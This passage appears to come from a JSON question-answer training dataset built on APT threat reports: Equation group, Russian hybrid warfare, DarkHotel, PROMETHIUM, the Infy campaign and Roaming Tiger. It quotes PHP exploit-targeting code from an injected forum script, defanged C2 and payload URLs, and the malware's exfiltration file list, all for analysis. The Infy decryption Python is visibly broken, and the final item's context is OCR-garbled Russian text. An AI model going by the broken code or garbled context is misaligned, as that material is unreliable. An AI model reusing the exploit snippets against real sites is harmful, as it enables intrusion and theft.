values:\n\u2022 84b8026b3f5e6dcfb29e82e0b0b0f386 \u2013 MD5 of \"Unregistered\"\n\u2022 e6d290a03b70cfa5d4451da444bdea39 \u2013 unknown MD5\nIn practice, this means that only logged-in users will be exploited. Next, the PHP exploitation script checks if the user comes from a specific address range:\n\u2022 if(preg_match('/^(64.38.3.50|195.28.|94.102.|91.93.|41.130.|212.118.|7 9.173.|85.159.|94.249.|86.108.)/',IPADDRESS)){return \"\";}\nConverting the ranges to their respective countries (except for 64.38.3.50, which is the only specific IP mentioned) we get the following TOP 3 countries that will NOT be exploited:\n1. Jordan\n2. Turkey\n3. Egypt\nThis means that the attackers have taken special care not to infect users visiting from certain ISPs in these countries. If the visitors are from any other IP range, the PHP script constructs an exploitation URL which includes the logged in vBulletin forum name:\n$htt=$htt.\"&sn=\".bin2hex(substr($u,0,14));\nThe vBulletin forum username is stored in hex, as the \"sn=\" parameter to the exploit site. The exploit site can choose to hit the visitor with an exploit depending on the username, meaning that the attackers are taking great care to infect only very specific targets on these forums.\nInterestingly, the PHP script produces a different HTML page for iPhone visitors:\n\u2022 if (preg_match('/iPhone/',$_SERVER['HTTP_USER_AGENT'])){$scroll='yes';}\nThis indicates that the exploit server is probably aware of iPhone visitors and can deliver exploits for them as well; otherwise, the exploitation URL can simply be removed for these visitors.\nMost recently, the attackers used Java exploits, delivered through a specific server to visitors from the Middle East via advertising networks on popular websites. Here's an example:\nstandardsandpraiserepurpose[.]com/login?qq=5eaae4d[SNIP]0563&rr=1&h=cc593a6bfd8e1e 26c2734173f0ef75be3527a205\nThese 2013-2014 attacks make use of a new domain, standardsandpraiserepurpose[.]com. Interesting to point out the similarity in the URL construction, with parameters \"rr=1\", followed by \"h=\" a value resembling a SHA1 hash, possibly the specific targeted username. Other collected \"h=\" values include the following:\nConsidering the length and format, one might suspect they are a SHA1 hash, however, unlike the forum MD5 hashes, we couldn't break any of them.\nThe exploits from standardsandpraiserepurpose[.]com targeted several Kaspersky Lab users and were all unsuccessful. The server attempts three different Java exploits, containing the same payload stored as \"info.dat\" inside the Java archive. These are simple downloaders that contain shellcode to download and execute the next stage from the C&C:\nUnfortunately, we weren't able to download a copy of the next stage as the URL was already dead at the time of checking, or else it is only served and built specifically for victims at specific IPs. Another unusual aspect of targeting included multiple infection attempts against users of a certain satellite internet provider in Afghanistan.\nBig Headline: 16. What kind of encryption algorithms are used by the EQUATION group?\nThe Equation group uses the RC5 and RC6 encryption algorithms quite extensively throughout their creations. They also use simple XOR, substitution tables, RC4 and AES.\nRC5 and RC6 are two encryption algorithms designed by Ronald Rivest in 1994 and 1998. They are very similar to each other, with RC6 introducing an additional multiplication in the cypher to make it more resistant. Both cyphers use the same key setup mechanism and the same magical constants named P and Q.\nThe RC5/6 implementation from Equation group's malware is particularly interesting and deserves special attention because of its specifics.\nEncryption-related code in a DoubleFantasy sample\nIn the screenshot above, one can observe the main loop of a RC6 key setup subroutine extracted from one of the Equation group samples.\nThis is how it looks in pseudocode:\nOne immediately notices the constants 0xB7E15163 and 0x61C88647.\nHere's what a normal RC6 key setup code looks like:\nInterestingly, the so-called Q constant usage is a bit different in the reference code.\nInside the Equation group malware, the encryption library uses a subtract operation with the constant 0x61C88647. In most publicly available RC5/6 code, this constant is usually stored as 0x9E3779B9, which is basically -0x61C88647. Since an addition is faster on certain hardware than a subtraction, it makes sense to store the constant in its negative form and adding it instead of subtracting.\nRC5 key setup reference document RFC2040 ()\nSearching for \"0x61C88647 0xB7E15163\" on Google results in barely two pages of results, indicating this combination of constants is relatively rare. Most of the hits are on Chinese forums.\nSearching for the 2-inverse constant \"0x9E3779B9 0xB7E15163\" results in a whopping 2500 hits.\nInterestingly, Regin implements the same constants in its RC5 code. Here's how the RC5 key setup code looks in Regin:\nIn total, we identified 20 different compiled versions of the RC5/6 code in the Equation group malware. Although similar, the RC5 code is a bit different in Regin \u2013 none of the known Equation samples uses the \"C7 41 10\" opcode for setting up the P constant, as Regin does.\nThis suggests that the EQUATION group and the Regin group are two different entities.\nBig Headline: 17. How does the EQUATION group's attack platforms compare with Regin?\nTo attack their victims, the EQUATION group used several cyberespionage platforms over the last 14 years. These include:\n\u2022 EQUATIONLASER \u2013 around 2001-2003\n\u2022 EQUATIONDRUG \u2013 2003 to 2013\n\u2022 GRAYFISH 1.0 \u2013 2008-present\n\u2022 GRAYFISH 2.0 \u2013 2012-present\nWith EQUATIONDRUG, we observed the use of virtual file systems, which is also one of the trademarks of the Regin group. This was taken to further extreme in GRAYFISH, which exclusively uses the registry to store all malware-related modules and data in encrypted format. The GRAYFISH registry-based architecture is more flexible, stealthy and more complex than Regin, for several reasons:\n\u2022 It doesn't use any files on disk which can be easily spotted by anomaly finders.\n\u2022 Each registry branch is encrypted with its own key, making decryption impossible without having the whole package.\n\u2022 Registry storage offers better granularity and less wasted space than Regin's VFSes.\nIn addition, we can compare the two platforms by their startup mechanisms. While 64-bit Regin uses a service that loads the remaining of the code from the end of the last partition on disk and further from the VFSes, GRAYFISH takes this a step further. The GRAYFISH bootkit starts from the VBR, loads the operating system and hijacks the loading of the first driver in the kernel. Next, it loads all the other malware stages from the registry, making it almost completely invisible in terms of footprint.\nFinally, in terms of advanced features, GRAYFISH and EQUATIONDRUG include perhaps the most sophisticated persistence mechanism we've ever seen: re-flashing the HDD firmware. Due to the complexity of this process and the knowledge and resources required to implement something like it, the mechanism appears to be out of the reach of most advanced threat groups in the world except the EQUATION group.\nThese as well as other general observations lead us to conclude that the EQUATION group surpasses Regin in sophistication and resources.\n\nWhat strategies does the Equation group employ to select and target victims, and how do they handle unintended infections?",
    "output": "A: The Equation group employs precise targeting methods, sometimes selecting victims with surgical precision. When precision is not feasible, they use a validator (DOUBLEFANTASY) implant to assess the victim's relevance. If a victim is deemed uninteresting, they are subsequently disinfected. The group has been observed targeting users through various means, such as exploiting vulnerabilities on online forums and delivering exploits via advertisements on popular websites in the Middle East. They also take measures to avoid infecting users from specific countries like Jordan, Turkey, and Egypt by checking IP addresses.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 2 Russian Cyber Strategy\nToday, how is this Clausewitzian-inspired Russian strategic imagination being applied to the use of cyber power? The answer can be found by first exploring the strategic challenge they apparently believe they face: the NATO alliance. NATO is based on the concept of collective defence that enhances its strategy of deterrence. Through formal agreements and long-standing and extensive collaboration, NATO sends a strong signal that member states will stand together in the face of threats to collectively deter aggression against its members. The objective of this deterrent policy is to preserve the peace. This is a key observation. The goal of NATO's deterrent strategy is to reduce or even eliminate the possibility of war by ensuring that aggressors understand ex ante that an attack against one of its members is an attack against the entire Alliance. Especially today, NATO primarily exists to prevent war, not to develop enhanced strategies or capabilities to prosecute war or to wield forces to achieve ancillary objectives. In a sense, NATO exists to preserve the peace and to make sure that changes to the status quo in Europe occur through political processes that lead to the spread of democracy, the rule of law, and adherence to international norms. The raison d'\u00eatre of NATO is to preserve the peace; the purpose behind its strategy is to deter war.\nRussia opted to pick a course of action not to defeat NATO, but NATO's strategy.\nTo achieve its objective \u2013 rapid change of the European status quo to better fit their Russia-centric, not democratically-cantered, interests and preferences \u2013 Russia opted to pick a course of action not to defeat NATO, but to defeat NATO's strategy. By presenting the Western alliance with a fait accompli through actions that produce minimal death and destruction, Russia attempted to shift the onus of escalation onto NATO, thereby inflicting a strategic defeat on the Alliance at the outset of hostilities or even in the event of non-democratic changes to the status quo. Russia is banking on the hope that NATO will either be incapable or unwilling to transform this strategic defeat into active conventional combat, which would further undermine NATO's goal of preserving the peace. In effect, the Russians seem to have realised that by defeating NATO's strategy at the outset of a confrontation, they can actually alter political perceptions within the Alliance in a way that suits their objectives. Put somewhat differently, the risk of a forceful NATO response to some provocation is minimised by keeping the death and destruction associated with any fait accompli to an absolute minimum. NATO is especially vulnerable to cyberattacks and information warfare because Russia can undermine NATO's deterrent strategy without causing casualties. NATO has the option of reversing the fait accompli, but the required level of death and destruction simply highlights the failure of its deterrent strategy.\nCyber power, as a key facet of hybrid warfare, is an important enabler in an attack on NATO's deterrent strategy.12 Cyber attacks are not specifically targeted to eliminate key nodes, but to intensify the fog of war by sowing confusion within command and control networks and NATO polities. For instance, according to press reports, Russian movement into the Ukraine was accompanied by myriad cyber attacks, including Distributed Denial of Service (DDoS) tactics against computers in Kyiv, Poland, the European Parliament, and the European Commission.13 If local political and military leaders cannot develop an accurate estimate of quickly developing events, critical hours or even days can be gained with which Russia can create facts on the ground that can only be reversed at great effort. A little bit of 'sand in the works', so to speak, is enough to further delay the relatively slow-pace of decision-making in the West.14\nCyber power is an important enabler in an attack on NATO's deterrent strategy.\nThe annexation of Crimea also began with a series of covert operations that used a disinformation campaign to create ambiguity and delay Ukraine's response, effectively extending the element of surprise achieved by the Russian gambit. According to Michael Kofman and Matthew Rohansky:\n'Russia's use of broadcast tools for propaganda and psychological operations, part of a broader information campaign to support the Crimean annexation, caught both the Ukraine and the West by surprise. Moscow amped up the alarmist content of its broadcasting . . . stoking fear and confusion in Crimea'.15\nAdmittedly, the annexation was completed using more traditional operations involving conventional units, but the cyber-enabled opening moves not only allowed Russia to test the Western response, but to buy the time needed to create a fait accompli through conventional means.\nWestern analysts have noted that even though the Crimea crisis surprised the West, the Russian effort to integrate television and the internet, especially various\ntypes of social media, into its effort to shape opponents' political perspectives, has been ongoing for quite some time. In a sense, Russia has worked hard to use the internet to shape the political environment of conflict: it has (1) developed internally and externally focused media with a significant online presence; (2) used social media to guarantee that Russian narratives reach the broadest possible audience; and (3) polished their content in terms of language and presentation so that it rings true in various cultural settings.16 These activities have recently been given their own moniker \u2013 trolling \u2013 the practice of creating cyber actors with false identities to communicate tailored messages to an unsuspecting audience.17 According to Keir Giles:\n12 As Michael Kofman and Matthew Rojansky note, 'hybrid warfare,' including the Russian variations used against the Ukraine is not unique. The point here, however, is that Russia is particularly adept as using cyber power in the practice of hybrid warfare; see Kofman and Rojansky, (op cit) p. 2. Other analysts have noted how the Crimea annexation and the additional actions against Ukraine were dependant on capabilities long under development that were especially crafted not to trigger a NATO response; Aleksandr Golts and Heidi Reisinger. 'Russia's Hybrid Warfare: Waging War below the Radar of Traditional Collective Defence,' Research Paper No 105 (Research Division \u2013 NATO Defence College Rome) November 2014.\n13 Owen Matthews. 'BIG READ: Russia leading the way in the cyber arms race,' Irish Examiner, Saturday June 13, 2015. www. irishexaminer.com'lifestyle'feature'big-read-russia-leading-the-way-in-the-cyber-arms-race-336675.html.\n14 The key point is that information denial or dominance does not have to be absolute, it just needs to foster delay and uncertainty in Western political and military decision-making. According to Paul Saunders, 'Russia's seizure of Crimea happened very quickly. U.S. and European decision-making processes just don't move at that speed, particularly when facing ambiguity. Once a Crimea-style operation has begun, it will be extremely difficult if not impossible for Western decision-makers to be sufficiently confident about the other side's intent to take consequential action before it's too late'; Saunders, P. 'Why America Can't Stop Russia's Hybrid Warfare,' The National Interest June 23, 2015. www.nationalinterest.org/feature/shy-america-can't-stop-russias-hybrid-warfare-13166.\n15 Kofman and Rojansky, p. 4.\n'Russian assessments of current events makes it clear that Russia considers itself to be engaged in full-scale information warfare, involving not only offensive but defensive operations \u2013 whether or not its notional adversaries have actually noticed this is happening'.18\nWhat most analysts fail to realise, however, is that Moscow has shaped this cyber-enabled information warfare in a very strategic manner. Cyber power is being wielded as a strategic weapon to create facts on the ground with the minimal use of kinetic force.\nQuestion: Why is Russia's use of cyber-enabled information warfare considered strategic, and what are the implications for NATO's response mechanisms?",
    "output": "Answer: Russia's use of cyber-enabled information warfare is considered strategic because it is wielded as a weapon to create facts on the ground with minimal use of kinetic force. This approach is designed to test the Western response and buy time needed to achieve objectives through conventional means. The implications for NATO's response mechanisms are significant, as the relatively slow pace of decision-making in the West can be further delayed by the 'sand in the works' created by cyber attacks, making it difficult for NATO to reverse the fait accompli without significant effort.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the APT report on PROMETHIUM and NEODYMIUM relate to Process Injection: Dynamic-link Library Injection, and what mitigations can be employed to prevent such attacks?",
    "output": "Process Injection: Dynamic-link Library Injection is a method of executing arbitrary code in the address space of a separate live process. This technique is commonly used by adversaries to evade process-based defenses and possibly elevate privileges. In the context of the APT report on PROMETHIUM and NEODYMIUM, we see that the attackers used a zero-day exploit to download a malicious payload, which involved injecting code into legitimate processes. Specifically, the report mentions that the malware injects code into legitimate processes, which is usually done to load the malware when system processes run. Furthermore, the report highlights the use of DLL-side loading, a technique in which attackers replace legitimate DLL files in non-standard folders with malicious ones so that the malicious file is loaded when the application or operating system starts. To mitigate such attacks, the report recommends enabling features such as Control Flow Guard, Credential Guard, and Hypervisor Code Integrity (HVCI) service, which can help prevent memory corruption vulnerabilities and ensure that only trusted code is executed. Additionally, the report suggests using Windows Defender Advanced Threat Protection (ATP) to detect and prevent malicious behavior, including DLL-side loading and code injection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nThe DarkHotel threat actors have been known to operate for a decade now, targeting thousands of businesses across the world via Wi\u00adFi infrastructure in hotels. Blending whaling (high-level spear phishing) techniques with advanced malware and other complex attack avenues (such as digital certificate factoring), the threat actors have been able to run their business undisturbed for years, except for the few times when samples of DarkHotel malware is documented in blog posts by threat researchers.\nThis whitepaper covers such a sample of a particular DarkHotel attack, known as lnexsmar. The sample dates back to September 2016, but our malware zoo reveals that samples with a high degree of similitude have been around since 2011.\nUnlike any other known DarkHotel campaigns, the isolated sample uses a new payload delivery mechanism rather than the consacrated zero-day exploitation techniques. Instead, the new campaign blends social engineering with a relatively complex Trojan to infect its selected pool of victims.\nMoreover, while most known DarkHotel campaigns target corporate research and development personnel, CEOs and other senior corporate officials, this attack seems focused on politics rather than financial gains.\n\nWhy did the DarkHotel threat actors shift their focus from targeting corporate personnel to political targets in the Inexsmar attack? Additionally, how does this change in targeting reflect on their overall strategy and capabilities?",
    "output": "The DarkHotel threat actors shifted their focus from targeting corporate research and development personnel, CEOs, and other senior corporate officials to political targets in the Inexsmar attack. This change in targeting suggests a strategic pivot towards influencing geopolitical outcomes rather than pursuing financial gains. This shift reflects the group's versatility and adaptability, indicating that they possess the capability to tailor their operations to different objectives. By targeting political entities, DarkHotel demonstrates an advanced level of sophistication and a deep understanding of the potential impact of their actions on global affairs.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 3 Crimea and Donbass\nBy the end of April 2014, the Russian Government had responded to these events by occupying and annexing the Ukrainian peninsula of Crimea, as well as military intervention in eastern Ukraine, where hostilities continue to this day.\nFrom the start of its Crimean operation, the Russian army moved to gain control of the peninsula's telecommunications infrastructure, severing cables and routing calls through Russian mobile operators. Ukrainian media companies lost their physical assets in Crimea, and local television programming shifted from Ukrainian to Russian channels. With physical access to its control infrastructure, Russia also commandeered the Ukrainian national satellite platform Lybid.\nFrom the start of its Crimean operation, the Russian army moved to gain control of telecommunications infrastructure.\nIn Kyiv, as soon as the Russian military occupied Crimea, the internal security staff of one of Ukraine's largest mobile operators immediately demanded the severing of communications links between Ukraine and the occupied territory. However, its pro-Russian management refused, and maintained unrestricted connectivity as long as possible, likely so that Russian security services could retain access to its internal systems, for intelligence gathering and other information operations.\nUkrainian mobile operators saw an increase in the volume of cyber crime emanating from Crimea, and it is likely that Russian security services acquired intelligence from information collected in this way.\nPro-Russia media, discussion forums, and social network groups were active in propaganda dissemination. The Crimea campaign was even buttressed by mass changes in Wikipedia, where Russian propaganda teams altered articles related to the events taking place there.\nToday in Crimea, Russian authorities have implemented content filtering for internet access, including the censorship of Ukrainian news sites. In November 2014, Russia announced it would create a cyber warfare-specific military unit in Crimea.\nPro-Ukrainian hackers have attacked Crimean websites during the occupation, such as that of the Crimean Parliament7 and a site linking to public web cameras.8 They have also released allegedly official Russian documents related to the conflict which were claimed to be stolen from Russian government servers.9\nAs the conflict shifted to Donbass, cyberspace played an increasingly important role in military operations. Physical attacks destroyed cabling, broadcast infra-\nstructure, and ATM networks, and this served to isolate the region from Ukrainian media, communications, and financial services.10 Military operations were coordinated with propaganda disseminated on Russian TV channels and internet-based media. Finally, the occupation army performs regular forensics checks on computers and mobile devices owned by the population in eastern Ukraine.\n7 'Vulnerabilities in (<http://www.rada.crimea.ua',12>)www.rada.crimea.ua',12 March 2014, Websecurity (<http://websecurity.com.ua/7041/>)http://websecurity.com.ua/7041/.\n8 'Ukrainian Cyber Army: video intelligence', Websecurity April 23, 2015, (<http://websecurity.com.ua/7717/>)http://websecurity.com.ua/7717/.\n9 Aric Toler. 'Russian Official Account of Attack on Ukraine Border Guards', bellingcat, 30 May 2015 (<https://www.bellingcat.com/news/uk-and-europe/2015/05/30/russian-official-account-of-attack-on-ukraine-border-guards/>)https://www.bellingcat. (<https://www.bellingcat.com/news/uk-and-europe/2015/05/30/russian-official-account-of-attack-on-ukraine-border-guards/>)com/news/uk-and-europe/2015/05/30/russian-official-account-of-attack-on-ukraine-border-guards/.\nRussian signals intelligence (SIGINT), including cyber espionage, has allowed for very effective combat operations planning against the Ukrainian army. Artillery fire can be adjusted based on location data gleaned from mobile phones and Wi-Fi networks.11 GPS signals can also be used to jam aerial drones. Ukrainian mobile traffic can be rerouted through Russian GSM infrastructure via a GSM signalling level (SS7) attack;12 in one case, this was accomplished through malicious VLR/HLR updates that were not properly filtered. Russian Security Services also use the internet to recruit mercenaries.\nRussian signals intelligence (SIGINT) has allowed for effective combat operations against the Ukrainian army.\nGenerally speaking, the computer systems and mobile communications of Ukrainian government, military, and critical infrastructure are under permanent attack, and their communications are routinely intercepted and analysed for information of intelligence value. There are also many attacks on Ukrainian businesses: examples include the Ukrainian Railway Company, Kievstar mobile operator,13 a SMART-TV retail shop,14 and a city billboard.15\n\nQ: What role did Russian signals intelligence (SIGINT) play in the conflict in Donbass, and how did it enhance combat operations against the Ukrainian army?",
    "output": "A: Russian signals intelligence (SIGINT), including cyber espionage, significantly enhanced combat operations against the Ukrainian army in Donbass. SIGINT allowed for effective combat operations planning by adjusting artillery fire based on location data obtained from mobile phones and Wi-Fi networks. GPS signals were used to jam aerial drones. Ukrainian mobile traffic was rerouted through Russian GSM infrastructure via a GSM signalling level (SS7) attack, which was accomplished through malicious VLR/HLR updates that were not properly filtered. This enabled Russian forces to intercept and analyze communications for intelligence purposes, providing a strategic advantage in military operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Post Publication\nIn the week following the publication of the original blog, we observed no unusual changes to the C2 infrastructure. Existing domains did move to new IP addresses, as we had previously seen periodically. Some new install domains were added, adhering to naming conventions of current domains (see appendix for new IOCs).\nThe attackers developed a new version (31), and we observed this deployed against a single Canadian target.\nThe file descriptions remained essentially the same (\"CLMediaLibrary Dynamic Link Library V3\"). Most importantly, there was no change to the encoding key (now using offset 20, and offset 11 for second pass against URL encoding) that we had observed being used for the entire decade-long campaign, and documented in our previous blog. From this we conclude that the attackers were unaware of our initial report.\nBig Headline: Sinkhole\nThrough cooperation with the parties responsible for the C2 domains, we took control of all but one of them, transferring the A records to a server we controlled. This prevented the attackers from being able to subsequently make any further changes to the domain configurations, issue commands to victims, or capture any further data for the majority of victims. An analysis of connections after transfer suggests that the attackers may have used a third-party service to try to understand why they had suddenly lost almost all of their traffic. Figure 1 shows that tool, a geographic representation of victim-C2 traffic, with all but one at that time now communicating with our sinkhole server.\nWe have since transferred sinkhole control to (<https://www.shadowserver.org/wiki/>)Shadowserver, whom we thank for subsequent victim notification & remediation ((<https://www.shadowserver.org/wiki/pmwiki.php/Involve/GetReportsOnYourNetwork>)https://www.shadowserver.org/wiki/pmwiki.php/Involve/GetReportsOnYourNetwork).\nBig Headline: Versions\nIn our original blog, we noted two distinct primary variants of the Infy malware. In addition to the original \"Infy\" variant, we also see the newer, more sophisticated, interactive, and fuller-featured \"Infy M\" variant deployed against\napparently-higher-value targets. Overall, 93% of all victims were infected with Infy, and 60% with Infy \"M\" (Figure 3). Combined with the low total number of victims, this suggests a great deal of care given to each individual campaign target. The large number of victims with both variants may relate to their complimentary feature set, or represent an \"upgrade\" path on victims from the original variant infection, later adding the \"M\" variant as targets appeared more compelling to the attackers.\nFor the Infy \"M\" variant, we note that the majority of targets are using the latest version (7.8), and that none are using the older 6.x versions at all (Figure 4). This suggests that these higher-value targets are paid much more attention, being kept up-to-date with the latest version.\nIn contrast, for the more basic original Infy variant, we note a full spectrum of versions installed (Figure 5), with many victims on older versions \u2013 including the original, decade-old V1 \u2013 suggesting much less concern is paid to these individual targets (note that we did observe a small number of the older 6.x versions but these do not announce their version when connecting).\nBig Headline: Game Over\nShortly after the takedown, as well as a new Infy version (31), we also observed the registration of multiple domains\nusing a previously-seen pattern, against known campaign IP addresses. Almost every domain in the pattern-range box4035[.]net \u2013 box4090[.]net (138.201.0.134). These were not observed in any sample C2 lists however. Bestwebstat[.]com was sinkholed by another operator.\nSome victims infected with Infy versions 15-24 still used the C2 server us1s2[.]strangled[.]net, which remained in the hands of the attacker. In early June the attackers used this C2 to issue instructions to download new Infy \"M\" version 8.0 from us1s2[.]strangled[.]net/bdc.tmp. This was the first time we had observed an Infy variant being directly updated to Infy \"M\". This used camouflage name \"Macromedia v4\", changed from \"v3\" seen in Infy v31. They also removed the voice recording capability in this version.\nuvps1[.]cotbm[.]com was used for data exfiltration, previously at 138.201.47.150, after publishing of our original blog moving to 144.76.250.205. It was also hosting malware updates at /themes/u.php.\nThey also added a curious C2 entry \"hxxp://box\" (note: defanged for publishing). It's unclear how this should function; possibly a compromised victim intranet device, or the attackers have modified the HOSTS file on the victim computer.\nAfter the take-down, the attackers began to add server IP addresses as well as domain names to their malware C2 list. They also slightly modified their ZIP password from \"Z8(2000_2001ul\" to \"Z8(2000_2001uIEr3\". Their new malware version added antivirus checks for Kaspersky Labs, Avast, and Trend Micro. The malware data capture now searches for file extensions:\n.doc, .docx, .xls, .xlsx, .xlr, .pps, .ppt, .pptx, .mdb, .accdb, .db, .dbf, .sql, .jpg, .jpeg, .psd, .tif, .mp4, .3gp, .txt, .rtf, .odt, .htm, .html, .pdf, .wps, .contact, .csv, .nbu, .vcf, .pst, .zip, .rar, .7z, .zipx, .pgp, .tc, .vhd, .p12, .crt.pem,.key.pfx, .asc, .cer, .p7b, .sst, .doc, .docx, .xls, .xlsx, .xlr, .pps, .ppt, .pptx.\nand folder locations:\n:\\$recycle.bin, :\\documents and settings, :\\msocache, :\\program files, :\\program files (x86), :\\programdata, :\\recovery, :\\system volume information:\\users, :\\windows, :\\boot, :\\inetpub, :\\i386.\nThe malware continued to use the identical decryption key seen over the entire history of this campaign.\nMid-June, through cooperation with the parties responsible for the C2 domains and law enforcement, we were able to get the remaining C2 domains null-routed and the directly-IP-addressed server disabled. This is the end of a decade-long campaign, though we naturally expect to see this actor back in some other guise before long.\nThanks to the Malware research team \u2013 Yaron Samuel, Artiom Radune, Mashav Sapir, Netanel Rimer \u2013 for assistance in the takedown.\nBig Headline: Appendix 1 \u2013 Exfiltration Algorithm\nThe malware uses a different algorithm than that used for encrypting the malware strings to encrypt the exfiltration data, including:\n1. Keylogger data + language.\n2. Malware logs \u2013 installation time, DLL path and name, log path, number of downloads, number of successful/failed connections.\n3. Information about the victim computer: Time zone, list of drives and types, running processes, disk info.\nFirst the malware adds 1 to all bytes, then an encryption key is initialized based on the victim computer name (the offset in the key is calculated by sum of the computer name letters %key length). Then the key is used to encrypt the data (see decrypt function). The encrypted data is then base64 encoded.\nExfiltration data decryption python code:\nimport os,sys\nimport string\nimport base64\nimport fileinput\nFIRST_PHASE = \"OQTJEqtsK0AUB9YXMwr8idozF7VWRPpnhNCHI6Dlkaubyxf5423jvcZ1LSGmge\"\nSECOND_PHASE = \"PqOwI1eUrYtT2yR3p4E5o6WiQu7ASlDkFj8GhHaJ9sKdLfMgNzBx0ZcXvCmVnb\"\nglobal FULL_KEY\nFULL_KEY= \"\"\ndef sub_1_for_hex(str_input):\nstr_output = \"\"\nfor letter in str_input:\ntry:\nstr_output += chr(ord(letter)-1)\nexcept:\nprint \"sub_1_for_hex func problem\"\ncontinue\nreturn str_output def sum_comp_name(comp_name): sum = 0\nfor letter in comp_name:\nsum+= ord(letter)\nreturn sum\ndef init_key(comp):\ncomp_name_sum = sum_comp_name(comp)\ncarry = divmod(comp_name_sum, 62)\nindex = carry[1] -1\nend_key = FIRST_PHASE[:index] key = FIRST_PHASE[index:]\nkey = key + end_key\nkey = key + key\nreturn key\ndef decrypt(num_list,offset):\nglobal FULL_KEY\ninput = \"\"\nfor num_str in num_list:\ntry:\ninput += num_str.decode('hex')\nexcept:\nresult = \"\"\nfor i, c in enumerate(input):\ni = i % 62 +1\ntry:\nindex = FULL_KEY.index(c)-1\nexcept ValueError:\nresult += c\ncontinue\ntranslated = SECOND_PHASE[(index - i +offset) % len(SECOND_PHASE)]\nresult += translated\nreturn result\ndef found_infy_enc_data(line):\nfound_infy_str = \"show=\\\"---------- Administration Reporting Service \"\nfound_infy_index = line.find(found_infy_str)\nif not found_infy_index==-1:\nreturn True,found_infy_index\nelse:\nreturn False,found_infy_index\ndef extract_comp_name(line):\ncomp = r\"\\xd\\xa-----\"\ncomp_index = line.find(comp)\ncomp_name = line[comp_index+len(comp):]\ncomp_name = comp_name[:comp_name.find(\"-----\" )]\nprint \"(((=)))\" + comp_name\nreturn comp_name\ndef extract_enc_data(line):\nheader = r\"\\xd\\xa_____\"\nstart_index = line.find(header)+len(header)\nline = line[start_index:]\nendindex = line.index(\"_____\\\" value=\")\nline = line[:endindex]\nreturn line\ndef write_enc_infy_data_to_file(dec_line,comp_name,filename):\nfile1 = open(filename + \"\\\\\" + comp_name + \".txt\",'ab')\nfile1.writelines(dec_line)\nfile1.close()\ndef enc_wrapper(enc,comp_name):\nglobal FULL_KEY\nprint FULL_KEY\nFULL_KEY = init_key(comp_name)\nenc_final = \"\"\nfor letter in enc:\nif len(hex(ord(letter))[2:])==1:\nenc_final += \"0\" + hex(ord(letter))[2:]\nelif len(hex(ord(letter))[2:])==2:\nenc_final += hex(ord(letter))[2:]\nelse:\nfinal_start = final[0:500]\nif final_start in UNIQUE_DATA:\nreturn\nUNIQUE_DATA.append(final_start)\nindex = final.find(\"Installed Date:\")\nif index==-1:\nfor i in range(1,61):\n##print all 62 options\nindex2 = final.find(\"PROGRAM START:\")\nindex3 = final.find(\"Installed Date:\")\nif not index2 ==-1 or not index3 ==-1:\nwrite_enc_infy_data_to_file(decrypt_data,comp_name,FILE_OUTPUT_NAME)\ndef read_enc_data_files():\nfor root,dir,files in os.walk(PDML_PATH):\nfor file in files:\nfilename = root+ \"\\\\\" + file\nif os.path.isfile(filename):\nprint filename\nfor line in fileinput.input([filename]):\nline = line.strip()\nis_found,found_infy_index= found_infy_enc_data(line)\nif not is_found:\ncontinue\n\nWhat are the key differences between the Infy and Infy 'M' variants of the malware used in the Prince of Persia campaign? How do these differences impact the targets?",
    "output": "The Infy 'M' variant is more sophisticated, interactive, and fuller-featured compared to the original Infy variant. Overall, 93% of all victims were infected with Infy, and 60% with Infy 'M'. The large number of victims with both variants may relate to their complementary feature set or represent an upgrade path. For the Infy 'M' variant, the majority of targets are using the latest version (7.8), and none are using the older 6.x versions, suggesting that these higher-value targets are paid much more attention. In contrast, for the original Infy variant, a full spectrum of versions is installed, with many victims on older versions, including the original, decade-old V1, suggesting much less concern is paid to these individual targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: CVE-2014-1761 is poorly implemented\nFirst stage shellcode can't find second stage shellcode \"p!11\"-marker:\nCqDTaro, qyo mecl\\'IOT(UI mu ma qyo ma\u00b7l\\'1 ma;ra;o no;ra;;ra;epz.aTL .Do3oouoBJie!D.ne naJiecr.n.mo-:n3pa.nJILct:oro ;ra;naJiora no oce1:1 oonpoca1\u00b71 o\u0141om\u00b7qaTeJILnoro craryca, BKJ1roqa11 HepycaJinl\\'1, rpan.n:ill{LJI n oez.e!DDjeB.\nl\\ilme 03\u00b7oecrmo,, qyo n y apa1fioo, n cpe;ra;n naJiecrnu11en me1\u20221aJio COl\u00b7l!UeBarom\u00b7nxrn no DODO;IJ;:Y \"' D03l\\'IOZ:HOCTD C10JIU3DTL no3DIJDD cropon. )];eiCTBDTeJILHO, -rpy;ra;uocrei IHIOl\"O. IIono11y ma;ra;o ;IJ;Yl\\'laTL O KaE!OU-TO <<crpaxoooqu,oi ceTKe>>,, K10Topa11 II03DOJIUJia 10.LJ1 coxpam:nTL .11epcneKTnoy 1\u00b71Dp a !U a liJIDZ!Uetl B OCTOKe.\nKat: 1me npe;ra;craBJIJleTCJI, B 3TOl\u2022I c11:LJ1CJie C03Liffl COBl\u2022leCTHOl\"O l\u00b7ID!UDCTepCKOl\"O 3ace;ra;a!DUJI \u00abKBapTeTa\u00bb npe;ra;craBUTeJiei Kot\u2022IDTeTa JIAr no apaoct:oi 1u1puoi nuB:unaTnoe craJI 101:,11 34>4>eKTUBH!bD\u00b71 maro1\u00b71, ocofieumo B CJI)rqae mey;r,;aqn npez.Der\u00b7o oapnamTa c naJiecrn.no-n3panJILCKD1:1n neperooopal\\'10.\nOcHOBHbie DJ)HHIJ;HDbl J)erJUlMeHTa DJ)HMeHeHHH ua\u0141IHCJieHH:U )];JIH D0)];r0T0BKH 6yxra.JITeJ)CKO:U 0\u0141IeTH0CTH Ha 7-:u J)rt.6oqu:u )];eHb\n\nAnswer this question based on the above context: In the context of the Roaming Tiger APT report, what specific vulnerability was exploited by the attackers, and how did the first stage shellcode fail to locate the second stage shellcode? Additionally, explain the significance of the 'p!11' marker in this context.",
